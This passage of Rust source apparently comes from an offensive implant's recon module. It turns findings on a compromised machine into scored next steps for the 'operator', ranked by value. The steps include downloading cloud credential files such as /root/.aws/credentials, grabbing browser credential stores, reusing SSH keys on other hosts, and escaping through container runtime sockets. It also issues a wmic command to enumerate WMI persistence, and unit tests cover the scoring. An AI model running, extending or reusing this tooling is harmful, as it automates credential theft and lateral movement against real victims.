        let candidate = match finding.kind.as_str() {
            "user" if finding.severity == SEV_HIGH => Some(Suggestion {
                title: format!("the account {} may be worth a look", finding.name),
                why: "the account is the root of the machine".to_string(),
                score: 70,
                action: format!("read the account {}", finding.name),
                kind: "shell".to_string(),
                args: vec![("cmd".to_string(), "id".to_string())],
            }),
            "share" => Some(Suggestion {
                title: format!("the share {} may be readable from here", finding.name),
                why: "a share is a way into another host".to_string(),
                score: 45,
                action: format!("list the share {}", finding.name),
                kind: "ls".to_string(),
                args: vec![("path".to_string(), finding.name.clone())],
            }),
            "listener" => Some(Suggestion {
                title: format!("the service on {} is worth a look", finding.name),
                why: "a service that listens is a service that was configured".to_string(),
                score: 20,
                action: format!("probe {}", finding.name),
                kind: "scan".to_string(),
                args: vec![("host".to_string(), finding.name.clone())],
            }),
            "sshkey" => Some(Suggestion {
                title: "an ssh key may open other hosts",
                why: "the key belongs to a user of the machine".to_string(),
                score: 65,
                action: "use the key".to_string(),
                kind: "ssh.exec".to_string(),
                args: vec![("target".to_string(), finding.name.clone())],
            }),
            "cloud" => Some(Suggestion {
                title: "a cloud credential is on the machine",
                why: "the credential opens the cloud account of the user".to_string(),
                score: 80,
                action: format!("read {}", finding.name),
                kind: "download".to_string(),
                args: vec![("path".to_string(), finding.name.clone())],
            }),
            "container" if finding.severity == SEV_HIGH => Some(Suggestion {
                title: "the container runtime is reachable",
                why: "the runtime socket is root on the host".to_string(),
                score: 90,
                action: "run a command in the host".to_string(),
                kind: "shell".to_string(),
                args: vec![("cmd".to_string(), "id".to_string())],
            }),
            "wmi" => Some(Suggestion {
                title: "a wmi subscription may be a persistence",
                why: "a wmi subscription runs with the privileges of its host".to_string(),
                score: 55,
                action: "read the subscription".to_string(),
                kind: "shell".to_string(),
                args: vec![("cmd".to_string(), "wmic /namespace:\\\\root\\subscription path __EventFilter list brief".to_string())],
            }),
            "browser" => Some(Suggestion {
                title: "the browser holds what the user typed",
                why: "the browser data is the credential of a human".to_string(),
                score: 60,
                action: format!("read {}", finding.name),
                kind: "download".to_string(),
                args: vec![("path".to_string(), finding.name.clone())],
            }),
            _ => None,
        };
        if let Some(suggestion) = candidate {
            if seen.insert(suggestion.title.clone(), ()).is_none() {
                out.push(suggestion);
            }
        }
    }
    out.sort_by(|a, b| b.score.cmp(&a.score));
    out.truncate(20);
    out
}

/// The suggestions as an upk map.
pub fn suggestions_value(items: &[Suggestion]) -> Value {
    crate::upk::map(vec![
        ("suggestions", crate::upk::arr(items.iter().map(|s| s.to_value()).collect())),
        ("total", crate::upk::u(items.len() as u64)),
    ])
}

/// The suggestions as the report the operator reads.
pub fn suggestions_text(items: &[Suggestion]) -> String {
    let mut out = format!("suggestions: {}\n", items.len());
    if items.is_empty() {
        return out;
    }
    out.push('\n');
    for item in items {
        out.push_str(&format!("  [{:>3}] {}\n", item.score, item.title));
        if !item.why.is_empty() {
            out.push_str(&format!("        {}\n", item.why));
        }
        out.push_str(&format!("        try: {} {}\n", item.kind, item.action));
    }
    out
}

/// The findings that travel with a task.
///
/// The operator may send the findings of an earlier recon back to the
/// implant, so the suggestions are made on the facts the operator already
/// has and does not have to collect them twice.
pub fn findings_from_value(value: &Value) -> Vec<Finding> {
    let items = match value {
        Value::Arr(items) => items.clone(),
        _ => return Vec::new(),
    };
    let mut out = Vec::new();
    for item in items {
        let kind = item.str_or("kind", "");
        if kind.is_empty() {
            continue;
        }
        out.push(Finding {
            kind,
            name: item.str_or("name", ""),
            detail: item.str_or("detail", ""),
            severity: item.str_or("severity", SEV_INFO),
            source: item.str_or("source", ""),
        });
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    fn finding(kind: &str, name: &str, severity: &str) -> Finding {
        Finding {
            kind: kind.to_string(),
            name: name.to_string(),
            detail: String::new(),
            severity: severity.to_string(),
            source: String::new(),
        }
    }

    #[test]
    fn a_profile_that_is_not_known_is_refused() {
        let err = profile_groups("nonsense").unwrap_err();
        assert!(err.contains("nonsense"), "{err}");
    }

    #[test]
    fn the_profiles_name_their_groups() {
        assert_eq!(profile_groups("cloud").unwrap(), vec!["cloud".to_string()]);
        assert_eq!(profile_groups("all").unwrap().len(), GROUPS.len());
    }

    #[test]
    fn a_check_that_does_not_run_is_skipped() {
        let report = run("cloud", &[]).unwrap();
        assert!(report.ran.contains(&"cloud".to_string()));
        assert!(report.findings.iter().all(|f| f.kind == "cloud"));
    }

    #[test]
    fn the_checks_may_be_named_one_by_one() {
        let report = run("", &["users".to_string()]).unwrap();
        assert_eq!(report.ran, vec!["users".to_string()]);
    }

    #[test]
    fn a_finding_travels_as_a_map() {
        let value = finding("user", "root", SEV_HIGH).to_value();
        assert_eq!(value.str_or("kind", ""), "user");
        assert_eq!(value.str_or("severity", ""), SEV_HIGH);
    }

    #[test]
    fn the_suggestions_are_scored() {
        let items = suggest(&[
            finding("user", "root", SEV_HIGH),
            finding("cloud", "/root/.aws/credentials", SEV_HIGH),
            finding("listener", "0.0.0.0:22", SEV_INFO),
        ]);
        assert!(items.len() >= 2, "{items:?}");
        // The cloud credential is worth more than the listener.
        assert_eq!(items[0].score, 80);
        for item in &items {
            assert!(item.score <= 100);
        }
    }

    #[test]
    fn the_report_reads_like_a_report() {
        let report = Report {
            profile: "host".to_string(),
            findings: vec![finding("user", "root", SEV_HIGH)],
            ran: vec!["users".to_string()],
            skipped: vec![],
        };
        let text = report.text();
        assert!(text.contains("profile : host"), "{text}");
        assert!(text.contains("[high  ]"), "{text}");
    }
}
